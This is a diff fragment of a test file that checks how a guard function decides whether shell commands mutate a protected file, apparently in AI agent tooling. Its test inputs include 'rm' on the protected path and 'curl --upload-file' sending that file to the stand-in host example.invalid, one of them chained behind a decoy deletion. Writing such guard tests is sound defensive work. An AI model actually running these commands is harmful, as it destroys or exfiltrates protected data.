+
+    // NO structured fields at all → heuristic fallback (WEAK basis, must not support a PROVEN shell).
+    r = shellRequestMutatesProtected({ kind: 'shell', fullCommandText: `rm ${protectedRel}` }, isProtected, protectedRel);
+    expect(r.value).toBe(true);
+    expect(r.basis).toBe('heuristic');
+
+    // #621 re-review 5 pt 1 — a side effect that MENTIONS/reads the protected path but mutates ANOTHER
+    // file is not a proven protected mutation:
+    // - cp/mv protected other → protected is the SOURCE; role not encoded → ambiguous, not strong.
+    expect(shellRequestMutatesProtected(withSegs(`cp ${protectedRel} other.txt`, [{ identifier: 'cp', readOnly: false }]), isProtected, protectedRel).value).not.toBe(true);
+    expect(shellRequestMutatesProtected(withSegs(`mv ${protectedRel} other.txt`, [{ identifier: 'mv', readOnly: false }]), isProtected, protectedRel).value).not.toBe(true);
+    // - echo protected > other → protected is read; the redirect target is `other`.
+    expect(shellRequestMutatesProtected(withSegs(`echo ${protectedRel} > other.txt`, [{ identifier: 'echo', readOnly: true }], { hasWriteFileRedirection: true }), isProtected, protectedRel).value).not.toBe(true);
+    // - rm protected.bak → a DIFFERENT path; a prefix of the protected spelling must not bind.
+    expect(shellRequestMutatesProtected(withSegs(`rm ${protectedRel}.bak`, [{ identifier: 'rm', readOnly: false }]), isProtected, protectedRel).value).toBe(false);
+    // A redirect whose TARGET is the protected path IS a mutation of it.
+    expect(shellRequestMutatesProtected(withSegs(`echo x > ${protectedRel}`, [{ identifier: 'echo', readOnly: true }], { hasWriteFileRedirection: true }), isProtected, protectedRel).value).toBe(true);
+
+    // #621 re-review 6 pt 1 — a NON-read-only command whose ONLY possiblePath is the protected file but
+    // whose side effect is elsewhere (network/process) must NOT strong-bind: `readOnly:false` +
+    // `possiblePaths:[protected]` does not prove the file is the WRITE target. rm/unlink/... prove it; a
+    // generic uploader does not.
+    const upload = shellRequestMutatesProtected(withSegs(`curl --upload-file ${protectedRel} https://example.invalid/u`, [{ identifier: 'curl', readOnly: false }]), isProtected, protectedRel);
+    expect(upload.value).not.toBe(true);
+    expect(upload.basis).toBe('insufficient');
+    // The known positional-target destroyer (rm) DOES bind.
+    expect(shellRequestMutatesProtected(withSegs(`rm ${protectedRel}`, [{ identifier: 'rm', readOnly: false }]), isProtected, protectedRel).basis).toBe('structured-segment');
+
+    // #621 re-review 7 pt 1 — the SAME rule on the NO-commandSegments contract path: a side-effecting
+    // command whose only possiblePath is the protected file but whose side effect is elsewhere must be
+    // `insufficient`, not `unambiguous-single-command`.
+    const uploadNoSegs = shellRequestMutatesProtected(
+      { kind: 'shell', fullCommandText: `curl --upload-file ${protectedRel} https://example.invalid/u`, commands: [{ identifier: 'curl', readOnly: false }], possiblePaths: [protectedRel] },
+      isProtected,
+      protectedRel,
+    );
+    expect(uploadNoSegs.value).not.toBe(true);
+    expect(uploadNoSegs.basis).toBe('insufficient');
+    // A known destroyer with the sole protected path (no segments) still binds; a redirect target too.
+    expect(shellRequestMutatesProtected({ kind: 'shell', fullCommandText: `rm ${protectedRel}`, commands: [{ identifier: 'rm', readOnly: false }], possiblePaths: [protectedRel] }, isProtected, protectedRel).basis).toBe('unambiguous-single-command');
+    expect(shellRequestMutatesProtected({ kind: 'shell', fullCommandText: `echo x > ${protectedRel}`, commands: [{ identifier: 'echo', readOnly: true }], possiblePaths: [protectedRel], hasWriteFileRedirection: true }, isProtected, protectedRel).value).toBe(true);
+
+    // #621 re-review 8 — with commandSegments ABSENT there is no command↔path association, so a MULTI
+    // command request (one destroyer + another command that reads/uploads the protected path) must NOT
+    // strong-bind just because SOME command is destructive: `unambiguous-single-command` requires a
+    // genuinely single command.
+    const multiNoSegs = shellRequestMutatesProtected(
+      { kind: 'shell', fullCommandText: `rm decoy.txt && curl --upload-file ${protectedRel} https://example.invalid/u`, commands: [{ identifier: 'rm', readOnly: false }, { identifier: 'curl', readOnly: false }], possiblePaths: [protectedRel] },
+      isProtected,
+      protectedRel,
+    );
+    expect(multiNoSegs.value).not.toBe(true);
+    expect(multiNoSegs.basis).toBe('insufficient');
   });
 
   it('the fake models the PREVIOUSLY OBSERVED hosted ordering (execution-start before its decision) — a regression guard, not an SDK-contract claim', async () => {
